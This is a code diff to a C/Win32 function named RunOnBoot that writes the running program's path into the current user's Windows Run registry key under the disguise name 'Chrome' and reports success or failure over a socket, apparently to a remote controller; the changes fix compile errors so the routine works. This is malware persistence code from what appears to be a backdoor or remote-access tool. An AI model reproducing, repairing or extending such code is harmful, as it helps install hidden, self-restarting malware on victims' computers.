@@ -20,28 +20,28 @@ void RunOnBoot() {
     TCHAR szPath[MAX_PATH];
     DWORD pathLength = 0;
 
-    pathLength = GetModuleFileName(null, szPath, MAX_PATH);
+    pathLength = GetModuleFileName(NULL, szPath, MAX_PATH);
     if(pathLength == 0) {
         //failed
-        send(sock, errorMessage, sizeof(error), 0);
+        send(sock, errorMessage, sizeof(errorMessage), 0);
         return;
     }
 
     HKEY NewValue;
     //open the registry and attempt to add value
-    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+    if(RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCCESS) {
         //failed
-        send(sock, errorMessage, sizeof(error), 0);
+        send(sock, errorMessage, sizeof(errorMessage), 0);
         return;
     }
-    DWORD pathLenthBytes = pathLength * sizeof(*szPath);
-    if(RegSetValueEx(NewValue, TEXT("Chrome"), REG_SZ, (LPBYTE) szPath, pathLengtBytes) != ERROR_SUCCESS) {
+    DWORD pathLengthBytes = pathLength * sizeof(*szPath);
+    if(RegSetValueEx(NewValue, TEXT("Chrome"), 0, REG_SZ, (LPBYTE) szPath, pathLengthBytes) != ERROR_SUCCESS) {
         //failed
         RegCloseKey(NewValue); //close the key
-        send(sock, errorMessage, sizeof(error), 0);
+        send(sock, errorMessage, sizeof(errorMessage), 0);
         return;  
     }
-    send(sock, successMessage, sizeof(successMessage));
+    send(sock, successMessage, sizeof(successMessage), 0);
     RegCloseKey(NewValue); //close the key
 }
 
